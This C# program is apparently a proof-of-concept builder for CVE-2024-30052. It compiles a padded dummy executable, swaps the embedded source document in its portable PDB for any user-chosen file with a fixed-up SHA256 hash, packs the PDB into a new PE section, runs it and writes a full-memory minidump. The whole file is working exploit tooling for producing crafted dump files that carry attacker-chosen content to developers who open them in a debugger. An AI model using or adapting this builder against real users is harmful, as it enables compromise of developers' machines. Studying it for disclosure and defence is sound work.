using System.Diagnostics;
using System.IO.Compression;
using System.Reflection.Metadata;
using System.Security.Cryptography;
using System.Text;
using AsmResolver.PE.File;
using AsmResolver.PE;
using AsmResolver.PE.File.Headers;
using AsmResolver.PE.Debug;
using AsmResolver;
using AsmResolver.IO;
using System.Runtime.InteropServices;

namespace CVE_2024_30052_builder
{
    internal class Program
    {
        static Guid k_EmbededSourceGUID = new("0E8A571B-6926-466E-B4AD-8AB04611F5FE");

        static string GenerateSourceFileForCompilation(string workingDir, string extension, int fileSize)
        {
            const string sourceFileText = @"
                namespace dummy_crash
                {
                    internal class Program
                    {
                        static void Main(string[] args)
                        {
                            while(true);
                        }
                    }
                }
                //";

            // random bytes to fill the original source file so that there's enough space to replace it with special file data later
            byte[] randomBytes = new byte[fileSize * 2];
            new Random().NextBytes(randomBytes);

            string finalSourceText = sourceFileText + BitConverter.ToString(randomBytes);
            string sourceFileName = workingDir + @"\program" + extension;
            try
            {
                File.WriteAllText(sourceFileName, finalSourceText);
            }
            catch (Exception e)
            {
                throw new Exception($"Unable to write source file to the disk. Exception: {e.Message}");
            }
            return sourceFileName;
        }

        static void CompileSource(string workingDirectory, string sourceFilepath)
        {
            FileInfo sourceFileinfo = new FileInfo(sourceFilepath);

            // we have to compile by invoking csc or msbuild, since framework compilation methods no longer support compiling from files
            string args = $"{sourceFileinfo.Name} -t:exe -debug:portable -embed";
            Process compilationProcess = new Process();
            compilationProcess.StartInfo.FileName = @"C:\Program Files\Microsoft Visual Studio\2022\Community\Msbuild\Current\Bin\Roslyn\csc.exe";
            compilationProcess.StartInfo.Arguments = args;
            compilationProcess.StartInfo.WorkingDirectory = sourceFileinfo.Directory.FullName;
            compilationProcess.StartInfo.RedirectStandardOutput = true;
            compilationProcess.StartInfo.RedirectStandardError = true;
            if (!compilationProcess.Start())
            {
                throw new Exception("Failed to start the compilation process.");
            }
            compilationProcess.WaitForExit();
            if (compilationProcess.ExitCode != 0)
            {
                throw new Exception("Compilation process returned a failure.");
            }
        }

        static void FindDocumentDataOffsetsInPDB(string sourceFilepath, string pdbFilename, out int hashOffset, out int hashSize, out int contentOffset, out int contentSize)
        {
            hashOffset = hashSize = contentOffset = contentSize = 0;
            byte[] docBytes = null;
            byte[] hashBytes = null;
            using (FileStream pdbMemoryStream = new FileStream(pdbFilename, FileMode.Open, FileAccess.Read))
            {
                using (MetadataReaderProvider pdbReaderProvider = MetadataReaderProvider.FromPortablePdbStream(pdbMemoryStream))
                {
                    if (pdbReaderProvider == null)
                    {
                        throw new Exception("Unable to read pdb metadata from the pdb file.");
                    }

                    MetadataReader pdbReader = pdbReaderProvider.GetMetadataReader();
                    foreach (DocumentHandle docHandle in pdbReader.Documents)
                    {
                        Document doc = pdbReader.GetDocument(docHandle);
                        string docName = pdbReader.GetString(doc.Name);
                        if (docName == sourceFilepath)
                        {
                            hashBytes = pdbReader.GetBlobBytes(doc.Hash);
                            foreach (CustomDebugInformationHandle debugInfoHandle in pdbReader.GetCustomDebugInformation(docHandle))
                            {
                                CustomDebugInformation debugInfo = pdbReader.GetCustomDebugInformation(debugInfoHandle);
                                if (pdbReader.GetGuid(debugInfo.Kind) == k_EmbededSourceGUID)
                                {
                                    docBytes = pdbReader.GetBlobBytes(debugInfo.Value);
                                }
                            }
                            break;
                        }
                    }
                }
            }

            if (docBytes == null || hashBytes == null)
            {
                throw new Exception("No document was found in the pdb.");
            }

            byte[] embeddedPdbBytes = File.ReadAllBytes(pdbFilename);
            hashOffset = embeddedPdbBytes.AsSpan().IndexOf(hashBytes);
            hashSize = hashBytes.Length;
            contentOffset = embeddedPdbBytes.AsSpan().IndexOf(docBytes);
            contentSize = docBytes.Length;
        }

        static void ReplaceDocumentInPDB(string sourceFilepath, string pdbFilename, byte[] newDocBytes)
        {
            FindDocumentDataOffsetsInPDB(sourceFilepath, pdbFilename, out int hashOffset, out int hashSize, out int contentOffset, out int contentSize);

            using (MemoryStream newPdbOutputStream = new MemoryStream())
            {
                newPdbOutputStream.Write(File.ReadAllBytes(pdbFilename));

                // overwrite hash (assuming SHA256, in theory other algorithms could be used but Roslyn always uses SHA256 afaik)
                byte[] newDocHash = SHA256.HashData(newDocBytes);
                newPdbOutputStream.Seek(hashOffset, SeekOrigin.Begin);
                newPdbOutputStream.Write(newDocHash);

                // overwrite content bytes
                using (MemoryStream newDocOutputStream = new MemoryStream())
                {
                    byte[] docLenBytes = BitConverter.GetBytes(newDocBytes.Length);
                    newDocOutputStream.Write(docLenBytes);
                    using (DeflateStream newDocDeflateStream = new DeflateStream(newDocOutputStream, CompressionLevel.SmallestSize, true))
                    {
                        newDocDeflateStream.Write(newDocBytes);
                    }

                    // check that there's enough space to write
                    if (newDocOutputStream.Length > contentSize)
                    {
                        throw new IndexOutOfRangeException("Not enough space to write new document's bytes in place of the old document.");
                    }
                    newPdbOutputStream.Seek(contentOffset, SeekOrigin.Begin);
                    newPdbOutputStream.Write(newDocOutputStream.ToArray());
                }

                newPdbOutputStream.Seek(0, SeekOrigin.Begin);

                // overwrite pdb file on the disk
                using (FileStream pdbOutputFileStream = new FileStream(pdbFilename, FileMode.OpenOrCreate, FileAccess.Write))
                {
                    newPdbOutputStream.CopyTo(pdbOutputFileStream);
                }
            }
        }

        static void EmbedPDBIntoExecutable(string exeFilepath, string pdbFilePath)
        {
            PEFile exePEFile = PEFile.FromFile(exeFilepath);
            byte[] pdbFileBytes = File.ReadAllBytes(pdbFilePath);

            DataDirectory debugDirectory = exePEFile.OptionalHeader.GetDataDirectory(DataDirectoryIndex.DebugDirectory);
            byte[] debugDirectoryBytes = null;
            using (MemoryStream debugDirectoryStream = new MemoryStream())
            {
                if (exePEFile.TryCreateDataDirectoryReader(debugDirectory, out var debugDirectoryReader))
                {
                    debugDirectoryStream.Write(debugDirectoryReader.ReadToEnd());
                }

                // Write a dummy debug data entry, we'll replace it with a genuine one later
                debugDirectoryStream.Write(new byte[DebugDataEntry.DebugDataEntryHeaderSize]);
                debugDirectoryBytes = debugDirectoryStream.ToArray();
            }

            // Below we create a new section
            // This section will hold the debug directories data and the embedded pdb data
            PESection embedPdbSection = null;
            byte[] embedPdbSectionBytes = null;
            using (MemoryStream pdbEmbedSectionStream = new MemoryStream())
            {
                // Write the debug data directories
                pdbEmbedSectionStream.Write(debugDirectoryBytes);

                // Write the embedded PDB identifier ("MPDB")
                pdbEmbedSectionStream.Write(Encoding.ASCII.GetBytes("MPDB"));
                // Write the length of the uncompressed pdb file
                pdbEmbedSectionStream.Write(BitConverter.GetBytes(pdbFileBytes.Length));
                // Write the compressed PDB data
                using (DeflateStream zipStream = new DeflateStream(pdbEmbedSectionStream, CompressionLevel.Optimal, false))
                {
                    zipStream.Write(pdbFileBytes);
                }

                embedPdbSectionBytes = pdbEmbedSectionStream.ToArray();
            }

            // Create a new section
            embedPdbSection = new PESection(".pdbemb", SectionFlags.MemoryRead | SectionFlags.ContentInitializedData, new AsmResolver.DataSegment(embedPdbSectionBytes));

            // Add the section to the PE file
            exePEFile.Sections.Add(embedPdbSection);

            // "Commit" our latest changes, this will update the rva/offsets of the new section
            exePEFile.UpdateHeaders();

            // Next, we'll redirect the debug directory to the beginning of the new section
            uint newDebugDirectorySize = debugDirectory.Size + DebugDataEntry.DebugDataEntryHeaderSize;
            DataDirectory newDebugDirectory = new DataDirectory(embedPdbSection.Rva, newDebugDirectorySize);
            exePEFile.OptionalHeader.DataDirectories[(int)DataDirectoryIndex.DebugDirectory] = newDebugDirectory;
            exePEFile.UpdateHeaders();

            // Since we now have section's rva/offsets, we can update the new debug entry to point to the embedded PDB
            DebugDataEntry embedPdbDebugDataEntry = new DebugDataEntry(new CustomDebugDataSegment((DebugDataType)0x11, new DataSegment(new byte[embedPdbSectionBytes.Length - newDebugDirectorySize])));
            embedPdbDebugDataEntry.Characteristics = 0;
            embedPdbDebugDataEntry.MinorVersion = 0x100;
            embedPdbDebugDataEntry.MajorVersion = 0x100;
            embedPdbDebugDataEntry.TimeDateStamp = (uint)DateTime.Now.Ticks;

            RelocationParameters relocParams = new();
            relocParams.Offset = embedPdbSection.Offset + newDebugDirectorySize;
            relocParams.Rva = embedPdbSection.Rva + newDebugDirectorySize;
            embedPdbDebugDataEntry.Contents.UpdateOffsets(relocParams);

            // Overwrite the dummy debug entry within the bytes we used for the section with the genuine debug data entry
            using (MemoryStream debugEntryMemoryStream = new MemoryStream(embedPdbSectionBytes, (int)(newDebugDirectorySize - DebugDataEntry.DebugDataEntryHeaderSize), (int)DebugDataEntry.DebugDataEntryHeaderSize))
            {
                BinaryStreamWriter writer = new BinaryStreamWriter(debugEntryMemoryStream);
                embedPdbDebugDataEntry.Write(writer);
            }

            using (MemoryStream outputExeBytesStream = new MemoryStream())
            {
                BinaryStreamWriter outputExeBytesWriter = new BinaryStreamWriter(outputExeBytesStream);
                exePEFile.Write(outputExeBytesWriter);
                File.WriteAllBytes(exeFilepath, outputExeBytesStream.ToArray());
            }
        }

        static void CleanupDirectory(string directory)
        {
            if (Directory.Exists(directory))
            {
                // try a few times just in case
                for (uint i = 0; i < 10; ++i)
                {
                    try
                    {
                        Directory.Delete(directory, true);
                        break;
                    }
                    catch
                    {
                        Thread.Sleep(500);
                    }
                }
            }
        }

        [DllImport("dbghelp.dll")]
        private static extern bool MiniDumpWriteDump(IntPtr hProcess, int processId, IntPtr hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

        private static void CaptureMiniDump(Process process, string dumpFilepath)
        {
            // Create a file to save the minidump
            using (var fileStream = new System.IO.FileStream(dumpFilepath, System.IO.FileMode.Create))
            {
                // Write the minidump
                const int MiniDumpWithFullMemory = 2;
                if (!MiniDumpWriteDump(process.Handle, process.Id, fileStream.SafeFileHandle.DangerousGetHandle(), MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
                {
                    throw new Exception("Failed to capture a minidump.");
                }
            }
        }

        static void StartExeAndGenerateDump(string exeFilepath, string dumpFilepath)
        {
            // Start the external program
            using (Process process = new Process())
            {
                process.StartInfo.FileName = exeFilepath;
                process.Start();

                // Wait for a few seconds for the process to start up
                Thread.Sleep(2000);

                // Capture the minidump
                CaptureMiniDump(process, dumpFilepath);

                process.Kill();
                process.WaitForExit();
            }
        }

        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("Usage: CVE-2024-30052-builder.exe <path_to_file_to_embed>");
                return;
            }

            string inputFilePath = args[0];
            byte[] inputFileBytes = File.ReadAllBytes(inputFilePath);
            if (inputFileBytes == null)
            {
                Console.WriteLine($"Unable to open the input file: {inputFilePath}");
                return;
            }

            string uniqueSessionId = Guid.NewGuid().ToString();
            if (Directory.CreateDirectory(uniqueSessionId) == null)
            {
                Console.WriteLine($"Unable to create a unique directory: {uniqueSessionId}");
                return;
            }

            try
            {
                FileInfo inputFileInfo = new FileInfo(inputFilePath);

                // generate source file + compile it
                Console.WriteLine("Generating exe + pdb...");
                string sourceFilepath = GenerateSourceFileForCompilation(uniqueSessionId, inputFileInfo.Extension, inputFileBytes.Length);
                CompileSource(uniqueSessionId, sourceFilepath);

                // replace document data in the generated pdb
                Console.WriteLine("Replacing source data in the pdb with input file data...");
                FileInfo sourceFileInfo = new(sourceFilepath);
                string pdbFileName = Path.Combine(sourceFileInfo.Directory.FullName, Path.GetFileNameWithoutExtension(sourceFileInfo.FullName)) + ".pdb";
                ReplaceDocumentInPDB(sourceFileInfo.FullName, pdbFileName, inputFileBytes);

                // embed new pdb into the executable
                Console.WriteLine("Embedding new portable pdb into the executable...");
                string exeFilePath = Path.Combine(sourceFileInfo.Directory.FullName, Path.GetFileNameWithoutExtension(sourceFileInfo.FullName)) + ".exe";
                EmbedPDBIntoExecutable(exeFilePath, pdbFileName);

                // run the program to create a dump
                Console.WriteLine("Generating a dump...");
                string dumpFilePath = uniqueSessionId + ".dmp";
                StartExeAndGenerateDump(exeFilePath, dumpFilePath);

                Console.WriteLine($"Dump file produced: {dumpFilePath}");
            }
            finally
            {
                Console.WriteLine("Cleaning up temp files...");
                CleanupDirectory(uniqueSessionId);
            }

            Console.WriteLine("Done.");
        }
    }
}
